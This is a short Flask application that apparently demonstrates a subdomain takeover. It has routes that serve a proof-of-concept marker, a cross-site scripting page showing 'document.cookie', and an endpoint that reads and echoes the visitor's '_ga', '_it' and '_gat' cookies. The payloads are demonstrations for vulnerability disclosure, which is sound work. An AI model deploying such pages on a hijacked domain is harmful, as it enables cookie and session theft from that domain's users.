from flask import Flask, request, make_response
app = Flask(__name__)

@app.route("/")
def hello():
    return ""

@app.route("/20wk2yc8p6caztasx7bb")
def hello_poc():
    return "<!-- subdomain takeover PoC by Dominique van Dorsselaer -->"

@app.route("/30prbe8wn2ap79kjt1he")
def hello_poc_sxss():
    return "<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html><!DOCTYPE html><title></title>"

@app.route('/6w1ymvcfdrf33n7m2cc6')
def collect_cookies():
    _ga = request.cookies.get('_ga')
    _git = request.cookies.get('_it')
    _gat = request.cookies.get('_gat')
    return f"Cookies to collect: \n\n" \
    f"_ga = {_ga} \n\n" \
    f"_git = {_git} \n\n" \
    f"_gat = {_gat} \n\n"
